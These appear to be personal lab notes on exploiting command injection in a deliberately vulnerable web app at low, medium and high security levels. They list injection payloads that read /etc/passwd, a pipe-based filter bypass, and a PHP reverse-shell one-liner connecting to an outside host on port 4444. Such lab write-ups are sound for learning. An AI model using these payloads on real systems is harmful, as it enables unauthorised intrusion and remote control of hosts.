Objective

Remotely, find out the user of the web service on the OS, as well as the machines hostname via RCE.

>[!important] Security is Set to Low

Command Injection is a very serious vulnerability.
Because when we find it we can often compromise the entire application and the host.
Basic exploitation that will test
; las -la

Logic Operators
&& ls -la

Testing IP adddress or site
```
https://tcm-sec.com;whoami
```
![[Pasted image 20231009200302.png]]

```
Command: ;whoami; asd
```

```
;ls -lah; asd
```
![[Pasted image 20231009200943.png]]

```
; cat /etc/passwd; asd
```
![[Pasted image 20231009201042.png]]

```
<ip address>; which bash
192.168.17.136; which bash
```
![[Pasted image 20231009201511.png]]

It's time to get a reverse shell bash didn't worked but php did as we get a shell successfully
```
192.168.17.136; /usr/bin/php -r '$sock=fsockopen("192.168.17.136",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
Only thing to note here is that we have provided the ip address ping and along that we have added the payload
The site got hung-up which is a sign we got a shell 
![[Pasted image 20231009202252.png]]

>[!important] Let's now change the level to medium and will see if any check are being happening now:


I tried the basic command chainning , logic operators , commenting rest of the commands but 
pipe for command chaining worked to bypass the medium security 
```
127.0.0.1 | ls -la
```
![[Pasted image 20231009203858 1.png]]


Let's try to get a reverse shell and i m not positive that will get a shell cuz the code is substituting ; with nothing as a result the payload will not work. I tried with nc ncat which don't need ; but not successful.

>[!important] Let's change the level to High


```
127.0.0.1|ls
```
![[Pasted image 20231009231740.png]]
Can't get the shell but still we can read the data it's more than nothing at this point time.

Resources
https://appsecexplained.gitbook.io/appsecexplained/common-vulns/injection/command-injection

https://www.youtube.com/watch?v=WiqRvlN_UIU

